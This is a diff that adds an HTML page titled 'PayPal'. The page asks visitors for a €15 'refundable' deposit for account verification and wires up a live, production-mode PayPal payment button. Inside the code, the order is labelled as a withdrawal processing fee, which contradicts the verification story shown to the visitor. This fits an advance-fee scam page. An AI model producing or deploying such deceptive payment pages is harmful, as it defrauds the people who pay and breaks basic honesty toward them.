@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal</title>
+    <style>
+        body { 
+            font-family: 'Inter', sans-serif; /* Usando Inter para um look moderno */
+            background-color: #f3f4f6; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .payment-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 12px; /* Mais arredondado */
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            border: 1px solid #e0e0e0;
+        }
+        h1 { 
+            color: #1f2937; 
+            margin-bottom: 15px; 
+            font-size: 2.2em; /* Título maior */
+        }
+        p { 
+            color: #4b5563; 
+            margin-bottom: 25px; 
+            font-size: 1.1em;
+            line-height: 1.6;
+        }
+        .amount-display {
+            font-size: 1.8em;
+            font-weight: 700;
+            color: #4f46e5; /* Cor de destaque */
+            margin-bottom: 35px;
+            padding: 10px 0;
+            border-top: 1px dashed #d1d5db;
+            border-bottom: 1px dashed #d1d5db;
+            display: inline-block;
+        }
+        #paypal-button-container {
+            margin-top: 40px; /* Mais espaço para o botão */
+        }
+        /* Responsividade básica */
+        @media (max-width: 600px) {
+            .payment-container {
+                padding: 25px;
+            }
+            h1 {
+                font-size: 1.8em;
+            }
+            .amount-display {
+                font-size: 1.5em;
+            }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="payment-container">
+        <h1>Account Verification</h1>
+        <p>To proceed with your account verification and ensure the security of the process, we require a deposit of €15. This amount will be fully refunded upon successful completion of the verification. This measure is essential to prevent fraud and ensure each account is verified individually.</p>
+
+        <p class="amount-display">15€</p> <div id="paypal-button-container"></div>
+    </div>
+
+    <script src="https://www.paypal.com/sdk/js?client-id=ATHoXsB4-vfvSx3aNJp6gEuaX7xlPnAaIHS88RSz6HxN4TuxmocZpYEtyJayB1VQJgDsX3B5kJd-w_4i&currency=EUR"></script>
+
+    <script>
+        paypal.Buttons({
+            // Defina como 'sandbox' para testes, 'production' para pagamentos reais
+            env: 'production', 
+
+            // Esta função é chamada quando o botão é clicado e cria a transação no PayPal
+            createOrder: function(data, actions) {
+                return actions.order.create({
+                    purchase_units: [{
+                        amount: {
+                            value: '15.00', // CORRIGIDO: Use ponto em vez de vírgula para decimais
+                            currency_code: 'EUR' 
+                        },
+                        description: 'Taxa de Processamento de Levantamento' 
+                    }]
+                });
+            },
+
+            // Esta função é chamada quando o comprador conclui o pagamento com sucesso
+            onApprove: function(data, actions) {
+                return actions.order.capture().then(function(details) {
+                    // Exibe um alerta de sucesso
+                    alert('Pagamento concluído por ' + details.payer.name.given_name + '!');
+                    // Redireciona para sua página de sucesso
+                    window.location.href = 'sucesso.html.html'; 
+                });
+            },
+
+            // Esta função é chamada se o comprador cancelar o pagamento
+            onCancel: function(data) {
+                alert('Pagamento cancelado.');
+                // Opcional: pode redirecionar para uma página de erro ou manter na página atual
+            },
+
+            // Esta função é chamada em caso de qualquer erro durante o processo de pagamento
+            onError: function(err) {
+                console.error('Um erro ocorreu durante o pagamento:', err);
+                alert('Ocorreu um erro durante o pagamento. Por favor, tente novamente.');
+            }
+        }).render('#paypal-button-container'); // Isso renderiza os botões do PayPal dentro da div com o ID especificado
+    </script>
+
+</body>
+</html>
